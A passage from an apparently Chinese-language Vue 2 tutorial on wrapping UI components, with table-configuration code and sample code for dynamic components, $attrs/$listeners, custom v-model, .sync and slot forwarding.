          <span>concat</span><span>:</span> <span>"1"</span><span>,</span>
        <span>}</span><span>,</span>
      <span>]</span><span>,</span>
      <span>option</span><span>:</span> <span>{</span>
        <span>// border: true,</span>
        <span>// printBtn: true,</span>
        <span>addBtn</span><span>:</span> <span>true</span><span>,</span>
        <span>index</span><span>:</span> <span>true</span><span>,</span>
        <span>page</span><span>:</span> <span>true</span><span>,</span>
        <span>indexLabel</span><span>:</span> <span>"序号"</span><span>,</span>
        <span>// align: 'center',</span>
        <span>// menuAlign: 'center',</span>
        <span>column</span><span>:</span> <span>[</span>
          <span>{</span>
            <span>label</span><span>:</span> <span>"标题"</span><span>,</span>
            <span>prop</span><span>:</span> <span>"title"</span><span>,</span>
          <span>}</span><span>,</span>
          <span>{</span>
            <span>label</span><span>:</span> <span>"描述"</span><span>,</span>
            <span>prop</span><span>:</span> <span>"desc"</span><span>,</span>
          <span>}</span><span>,</span>
          <span>{</span>
            <span>label</span><span>:</span> <span>"标签"</span><span>,</span>
            <span>prop</span><span>:</span> <span>"tags"</span><span>,</span>
            <span>slot</span><span>:</span> <span>true</span><span>,</span>
            <span>type</span><span>:</span> <span>"select"</span><span>,</span>
            <span>multiple</span><span>:</span> <span>true</span><span>,</span>
            <span>filterable</span><span>:</span> <span>true</span><span>,</span>
            <span>allowCreate</span><span>:</span> <span>true</span><span>,</span>
            <span>defaultFirstOption</span><span>:</span> <span>true</span><span>,</span>
            <span>dicData</span><span>:</span> <span>[</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"数据库"</span><span>,</span>
                <span>value</span><span>:</span> <span>"数据库"</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"HTTP"</span><span>,</span>
                <span>value</span><span>:</span> <span>"HTTP"</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"API"</span><span>,</span>
                <span>value</span><span>:</span> <span>"API"</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"文件"</span><span>,</span>
                <span>value</span><span>:</span> <span>"文件"</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"HDFS"</span><span>,</span>
                <span>value</span><span>:</span> <span>"HDFS"</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"SPARK"</span><span>,</span>
                <span>value</span><span>:</span> <span>"SPARK"</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"HAVE"</span><span>,</span>
                <span>value</span><span>:</span> <span>"HAVE"</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"FTP"</span><span>,</span>
                <span>value</span><span>:</span> <span>"FTP"</span><span>,</span>
              <span>}</span><span>,</span>
            <span>]</span><span>,</span>
          <span>}</span><span>,</span>
          <span>{</span>
            <span>label</span><span>:</span> <span>"上传者"</span><span>,</span>
            <span>prop</span><span>:</span> <span>"create_user"</span><span>,</span>
          <span>}</span><span>,</span>
          <span>{</span>
            <span>label</span><span>:</span> <span>"上传部门"</span><span>,</span>
            <span>prop</span><span>:</span> <span>"create_update"</span><span>,</span>
          <span>}</span><span>,</span>
          <span>{</span>
            <span>label</span><span>:</span> <span>"联系方式"</span><span>,</span>
            <span>prop</span><span>:</span> <span>"concat"</span><span>,</span>
          <span>}</span><span>,</span>
        <span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>

  <span>methods</span><span>:</span> <span>{</span>
    <span>setClass</span><span>(</span><span><span>{</span> row<span>,</span> column<span>,</span> rowIndex<span>,</span> columnIndex <span>}</span> <span>=</span> <span>{</span><span>}</span></span><span>)</span> <span>{</span>
      <span>// console.log(column)</span>
      <span>const</span> <span>{</span> label <span>}</span> <span>=</span> column<span>;</span>
      <span>if</span> <span>(</span>label <span>===</span> <span>"操作"</span><span>)</span> <span>{</span>
        <span>return</span> <span>"no-print"</span><span>;</span>
      <span>}</span>
      <span>// if (columnIndex === 8) {</span>
      <span>//   return 'no-print'</span>
      <span>// }</span>
    <span>}</span><span>,</span>
    <span>rowPrint</span><span>(</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>option<span>.</span>menu <span>=</span> <span>false</span><span>;</span>
      <span>const</span> printDOM <span>=</span> <span>this</span><span>.</span>$refs<span>.</span>crud<span>.</span>$el<span>.</span><span>querySelector</span><span>(</span><span>".el-table"</span><span>)</span><span>;</span>
      <span>this</span><span>.</span>printLoading <span>=</span> <span>true</span><span>;</span>
      <span>this</span><span>.</span><span>toImage</span><span>(</span>printDOM<span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>async</span> <span>toImage</span><span>(</span><span>printDOM</span><span>)</span> <span>{</span>
      <span>setTimeout</span><span>(</span><span>async</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
        <span>const</span> canvas <span>=</span> <span>await</span> <span>html2canvas</span><span>(</span>printDOM<span>)</span><span>;</span>
        <span>const</span> dataURL <span>=</span> canvas<span>.</span><span>toDataURL</span><span>(</span><span>"image/png"</span><span>,</span> <span>1.0</span><span>)</span><span>;</span>
        <span>this</span><span>.</span>printImg <span>=</span> dataURL<span>;</span>
        <span>await</span> <span>this</span><span>.</span><span>$nextTick</span><span>(</span><span>)</span><span>;</span>
        <span>if</span> <span>(</span><span>this</span><span>.</span>printImg<span>)</span> <span>{</span>
          <span>this</span><span>.</span><span>$print</span><span>(</span><span>this</span><span>.</span>$refs<span>.</span>printImg<span>,</span> <span>{</span>
            <span>isImg</span><span>:</span> <span>true</span><span>,</span>
          <span>}</span><span>)</span><span>;</span>
        <span>}</span>
        <span>this</span><span>.</span>printLoading <span>=</span> <span>false</span><span>;</span>
        <span>this</span><span>.</span>option<span>.</span>menu <span>=</span> <span>true</span><span>;</span>
      <span>}</span><span>,</span> <span>100</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>rowDel</span><span>(</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span><span>$confirm</span><span>(</span><span>"此操作将永久删除该数据, 是否继续?"</span><span>,</span> <span>"提示"</span><span>,</span> <span>{</span>
        <span>confirmButtonText</span><span>:</span> <span>"确定"</span><span>,</span>
        <span>cancelButtonText</span><span>:</span> <span>"取消"</span><span>,</span>
        <span>type</span><span>:</span> <span>"warning"</span><span>,</span>
      <span>}</span><span>)</span>
        <span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
          <span>this</span><span>.</span><span>$message</span><span>(</span><span>{</span>
            <span>type</span><span>:</span> <span>"success"</span><span>,</span>
            <span>message</span><span>:</span> <span>"删除成功!"</span><span>,</span>
          <span>}</span><span>)</span><span>;</span>
        <span>}</span><span>)</span>
        <span>.</span><span>catch</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
          <span>this</span><span>.</span><span>$message</span><span>(</span><span>{</span>
            <span>type</span><span>:</span> <span>"info"</span><span>,</span>
            <span>message</span><span>:</span> <span>"已取消删除"</span><span>,</span>
          <span>}</span><span>)</span><span>;</span>
        <span>}</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>

<span><span><span>&lt;</span>style</span><span>></span></span><span><span>
<span>.el-tag + .el-tag</span> <span>{</span>
  <span>margin-left</span><span>:</span> 10px<span>;</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>style</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="二次封装思路" tabindex="-1"> 二次封装思路</h2>
<p>更多的封装思路阅读 <a href="https://juejin.im/post/6844904191224184840" target="_blank" rel="noopener noreferrer">绝对干货~！学会这些 Vue 小技巧, 可以早点下班和女神约会了</a></p>
<h3 id="component-动态组件" tabindex="-1"> component 动态组件</h3>
<div><p>提示</p>
<p>使用到的是 vue 中的动态组件 <code>component</code></p>
</div>
<ul>
<li>
<p>Props</p>
<ul>
<li><code>is</code> : - <em>string</em> | <em>ComponentDefinition</em> | <em>ComponentConstructor</em></li>
<li><code>inline-template</code> : - <em>boolean</em></li>
</ul>
</li>
<li>
<p>用法</p>
<p>渲染一个“元组件”为动态组件。依 <code>is</code> 的值, 来决定哪个组件被渲染。</p>
</li>
</ul>
<div><pre><code><span>&lt;!-- 动态组件由 vm 实例的 `componentId` property 控制 --></span>
<span><span><span>&lt;</span>component</span> <span>:is</span><span><span>=</span><span>"</span>componentId<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>component</span><span>></span></span>

<span>&lt;!-- 也能够渲染注册过的组件或 prop 传入的组件 --></span>
<span><span><span>&lt;</span>component</span> <span>:is</span><span><span>=</span><span>"</span>$options.components.child<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>component</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><ul>
<li>参考：<a href="https://cn.vuejs.org/v2/guide/components.html#%E5%8A%A8%E6%80%81%E7%BB%84%E4%BB%B6" target="_blank" rel="noopener noreferrer">动态组件</a></li>
</ul>
<p>示例：</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>component</span> <span>:is</span><span><span>=</span><span>"</span>getComponent(type)<span>"</span></span><span>></span></span> <span><span><span>&lt;/</span>component</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>type</span><span>:</span> <span>"input"</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>getComponent</span><span>(</span><span>type</span><span>)</span> <span>{</span>
      <span>return</span> <span><span>`</span><span>el-</span><span><span>${</span>type<span>}</span></span><span>`</span></span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="attrs-与-listeners" tabindex="-1"> $attrs 与 $listeners</h3>
<div><p>提示</p>
<p><code>$attrs</code> : 当组件在调用时传入的属性没有在 <code>props</code> 里面定义时, 传入的属性将被绑定到 <code>$attrs</code> 属性内（ <code>class</code> 与 <code>style</code> 除外, 他们会挂载到组件最外层元素上）。并可通过 <code>v-bind=&quot;$attrs&quot;</code> 传入到内部组件中。</p>
<p><code>$listeners</code> : 当组件被调用时, 外部监听的这个组件的所有事件都可以通过 <code>$listeners</code> 获取到。并可通过 <code>v-on=&quot;$listeners&quot;</code> 传入到内部组件中。</p>
</div>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>component-name</span> <span>v-bind</span><span><span>=</span><span>"</span>$attrs<span>"</span></span> <span>v-on</span><span><span>=</span><span>"</span>$listeners<span>"</span></span> <span>/></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>对于 <code>$attrs</code> , 我们也可以使用 <code>$props</code> 来代替, 实现代码如下</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>component-name</span> <span>v-bind</span><span><span>=</span><span>"</span>$props<span>"</span></span> <span>v-on</span><span><span>=</span><span>"</span>$listeners<span>"</span></span> <span>/></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="自定义-v-model" tabindex="-1"> 自定义 v-model</h3>
<p>在用 Vue 开发前端时, 不论使用原生还是封装好的 UI 库, 对于表单组件, 一般都会使用到<code>v-model</code>。虽然 <code>v-model</code> 是一个语法糖, 但是吃到嘴里挺甜的啊。学会自定义<code>v-model</code>, 还是很有必要的。</p>
<p>一个组件上的 <code>v-model</code> 默认是通过在组件上面定义一个名为 <code>value</code> 的 <code>props</code>,同时对外暴露一个名为 <code>input</code> 的事件。</p>
<p>方式一：通过 change 监听方式同步数据</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>custom-input<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>input</span> <span>:value</span><span><span>=</span><span>"</span>value<span>"</span></span> <span>@change</span><span><span>=</span><span>"</span>$_handleChange<span>"</span></span> <span>/></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>name</span><span>:</span> <span>"custom-input"</span><span>,</span>
  <span>props</span><span>:</span> <span>{</span>
    <span>value</span><span>:</span> <span>{</span>
      <span>type</span><span>:</span> String<span>,</span>
      <span>default</span><span>:</span> <span>""</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>$_handleChange</span><span>(</span><span>e</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span><span>$emit</span><span>(</span><span>"input"</span><span>,</span> e<span>.</span>target<span>.</span>value<span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>方式二：使用 <code>computed</code> 中的 <code>get</code> 和 <code>set</code> 方法进行同步</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>custom-input<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>input</span> <span>v-model</span><span><span>=</span><span>"</span>text<span>"</span></span> <span>/></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>name</span><span>:</span> <span>"custom-input"</span><span>,</span>
  <span>props</span><span>:</span> <span>{</span>
    <span>value</span><span>:</span> <span>{</span>
      <span>type</span><span>:</span> String<span>,</span>
      <span>default</span><span>:</span> <span>""</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>computed</span><span>:</span> <span>{</span>
    <span>text</span><span>:</span> <span>{</span>
      <span>get</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>this</span><span>.</span>value<span>;</span>
      <span>}</span><span>,</span>
      <span>set</span><span>(</span>value<span>)</span> <span>{</span>
        <span>this</span><span>.</span><span>$emit</span><span>(</span><span>"input"</span><span>,</span> value<span>)</span><span>;</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>使用方式</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>custom-input</span> <span>v-model</span><span><span>=</span><span>"</span>text<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>custom-input</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>text</span><span>:</span> <span>""</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="自定义-sync" tabindex="-1"> 自定义 .sync</h3>
<p>在 Vue 中, props 属性是单向数据传输的,父级的 prop 的更新会向下流动到子组件中, 但是反过来不行。可是有些情况, 我们需要对 <code>prop</code> 进行“双向绑定”。上文中, 我们提到了使用 <code>v-model</code> 实现双向绑定。但有时候我们希望一个组件可以实现多个数据的“双向绑定”, 而 <code>v-model</code> 一个组件只能有一个(Vue3.0 可以有多个), 这时候就需要使用到 <code>.sync</code>。</p>
<p><code>.sync</code> 与 <code>v-model</code> 的异同</p>
<ul>
<li>
<p>相同点：</p>
<ul>
<li>两者的本质都是语法糖, 目的都是实现组件与外部数据的双向绑定</li>
<li>两个都是通过属性+事件来实现的</li>
</ul>
</li>
<li>
<p>不同点：</p>
<ul>
<li>一个组件只能定义一个 <code>v-model</code>, 但可以定义多个 <code>.sync</code></li>
<li><code>v-model</code> 与 <code>.sync</code> 对于的事件名称不同, <code>v-model</code> 默认事件为 <code>input</code>,可以通过配置 <code>model</code> 来修改, <code>.sync</code> 事件名称固定为 <code>update:属性名</code></li>
</ul>
</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>v-show</span><span><span>=</span><span>"</span>visible<span>"</span></span> <span>@click</span><span><span>=</span><span>"</span>$_handlerCLick<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>name</span><span>:</span> <span>"custom-model"</span><span>,</span>
  <span>props</span><span>:</span> <span>{</span>
    <span>visible</span><span>:</span> <span>{</span>
      <span>type</span><span>:</span> Boolean<span>,</span>
      <span>default</span><span>:</span> <span>false</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>$_handlerCLick</span><span>(</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span><span>$emit</span><span>(</span><span>"update:visible"</span><span>,</span> <span>false</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>使用方式</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>custom-model</span> <span>:visible.sync</span><span><span>=</span><span>"</span>show<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>custom-model</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>show</span><span>:</span> <span>false</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="slot" tabindex="-1"> slot</h3>
<div><p>提示</p>
<p>二次封装时需要保留原组件中的 slot 插槽, <code>$slots</code> 获取到当前组件传入的所有 slot 插槽</p>
</div>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>component-name</span><span>></span></span>
    <span><span><span>&lt;</span>template</span> <span>v-for</span><span><span>=</span><span>"</span>slot in Object.keys($slots)<span>"</span></span> <span>:slot</span><span><span>=</span><span>"</span>slot<span>"</span></span><span>></span></span>
      <span><span><span>&lt;</span>slot</span> <span>:name</span><span><span>=</span><span>"</span>slot<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;/</span>template</span><span>></span></span>
  <span><span><span>&lt;/</span>component-name</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在开发过程中, 我们还会遇到以下的场景</p>
<p>下面是你封装的一个组件, 可以看到 <code>a-form-item</code> 已经有默认的 default 插槽了, 但是我们在使用它时又想自定义 <code>a-form-item</code> 中的其他插槽</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>a-form</span><span>></span></span>
    <span><span><span>&lt;</span>a-form-item</span> <span>v-for</span><span><span>=</span><span>"</span>(item, index) in opt<span>"</span></span> <span>:key</span><span><span>=</span><span>"</span>index<span>"</span></span><span>></span></span>
      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>"</span>default<span>"</span></span><span>></span></span>
        <span><span><span>&lt;</span>slot</span> <span>:name</span><span><span>=</span><span>"</span>item.prop<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>slot</span><span>></span></span>
      <span><span><span>&lt;/</span>template</span><span>></span></span>

      <span>&lt;!-- 以下这种写法不优雅, 比较繁琐, 又有重复的代码 --></span>
      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>"</span>label<span>"</span></span><span>></span></span>
        <span><span><span>&lt;</span>slot</span> <span>:name</span><span><span>=</span><span>"</span>`${item.prop}Label`<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>slot</span><span>></span></span>
      <span><span><span>&lt;/</span>template</span><span>></span></span>
      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>"</span>extra<span>"</span></span><span>></span></span>
        <span><span><span>&lt;</span>slot</span> <span>:name</span><span><span>=</span><span>"</span>`${item.prop}Extra`<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>slot</span><span>></span></span>
      <span><span><span>&lt;/</span>template</span><span>></span></span>
      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>"</span>help<span>"</span></span><span>></span></span>
        <span><span><span>&lt;</span>slot</span> <span>:name</span><span><span>=</span><span>"</span>`${item.prop}Help`<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>slot</span><span>></span></span>
      <span><span><span>&lt;/</span>template</span><span>></span></span>
      <span>&lt;!-- 之后 a-form-item 如果有添加了其他的 slot,岂不是这里还需要继续添加代码, 这样是不好的 --></span>
    <span><span><span>&lt;/</span>a-form-item</span><span>></span></span>
  <span><span><span>&lt;/</span>a-form</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>props</span><span>:</span> <span>{</span>
    <span>opt</span><span>:</span> <span>{</span>
      <span>type</span><span>:</span> Array<span>,</span>
      <span>default</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>[</span><span>]</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>可以参考以下的方式优化它</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>a-form</span><span>></span></span>
    <span><span><span>&lt;</span>a-form-item</span> <span>v-for</span><span><span>=</span><span>"</span>(item, index) in opt<span>"</span></span> <span>:key</span><span><span>=</span><span>"</span>index<span>"</span></span><span>></span></span>
      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>"</span>default<span>"</span></span><span>></span></span>
        <span><span><span>&lt;</span>slot</span> <span>:name</span><span><span>=</span><span>"</span>item.prop<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>slot</span><span>></span></span>
      <span><span><span>&lt;/</span>template</span><span>></span></span>

      <span><span><span>&lt;</span>template</span>
        <span>v-for</span><span><span>=</span><span>"</span>itemSlot in getItemSlots(Object.keys($slots))<span>"</span></span>
        <span>:slot</span><span><span>=</span><span>"</span>itemSlot<span>"</span></span>
      <span>></span></span>
        <span><span><span>&lt;</span>slot</span>
          <span>:name</span><span><span>=</span><span>"</span>getItemSlotName(itemSlot, item.prop)<span>"</span></span>
          <span>v-if</span><span><span>=</span><span>"</span>getItemSlotName(itemSlot, item.prop)<span>"</span></span>
        <span>/></span></span>
      <span><span><span>&lt;/</span>template</span><span>></span></span>
    <span><span><span>&lt;/</span>a-form-item</span><span>></span></span>
  <span><span><span>&lt;/</span>a-form</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>props</span><span>:</span> <span>{</span>
    <span>opt</span><span>:</span> <span>{</span>
      <span>type</span><span>:</span> Object<span>,</span>
      <span>default</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>{</span><span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>getItemSlots</span><span>(</span><span>slots</span><span>)</span> <span>{</span>
      <span>const</span> props <span>=</span> <span>this</span><span>.</span><span>getFormPropKey</span><span>(</span><span>)</span><span>;</span>
      <span>let</span> itemSlots <span>=</span> slots<span>.</span><span>filter</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> props<span>.</span><span>indexOf</span><span>(</span>item<span>)</span> <span>===</span> <span>-</span><span>1</span><span>)</span><span>;</span>
      itemSlots <span>=</span> itemSlots<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span>{</span>
        <span>const</span> tmp <span>=</span> item<span>.</span><span>split</span><span>(</span><span><span>/</span><span>(?=[A-Z])</span><span>/</span></span><span>)</span><span>;</span>
        <span>return</span> tmp<span>[</span>tmp<span>.</span>length <span>-</span> <span>1</span><span>]</span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span><span>;</span>
      <span>}</span><span>)</span><span>;</span>
      <span>return</span> itemSlots<span>;</span>
    <span>}</span><span>,</span>
    <span>getItemSlotName</span><span>(</span><span>slot</span><span>)</span> <span>{</span>
      <span>const</span> _slot <span>=</span> slot<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>\b\w</span><span>/</span><span>g</span></span><span>,</span> <span>(</span><span>str</span><span>)</span> <span>=></span> <span>{</span>
        <span>return</span> str<span>.</span><span>toUpperCase</span><span>(</span><span>)</span><span>;</span>
      <span>}</span><span>)</span><span>;</span>
      <span>return</span> <span><span>`</span><span><span>${</span>prop<span>}</span></span><span><span>${</span>_slot<span>}</span></span><span>`</span></span><span>;</span>
    <span>}</span><span>,</span>
    <span>getFormPropKey</span><span>(</span><span>)</span> <span>{</span>
      <span>const</span> <span>{</span> opt <span>}</span> <span>=</span> <span>this</span><span>;</span>
      <span>let</span> props <span>=</span> <span>[</span><span>]</span><span>;</span>
      <span>if</span> <span>(</span>opt<span>.</span>length<span>)</span> <span>{</span>
        props <span>=</span> opt<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> item<span>.</span>prop<span>)</span><span>;</span>
      <span>}</span>
      <span>return</span> props<span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
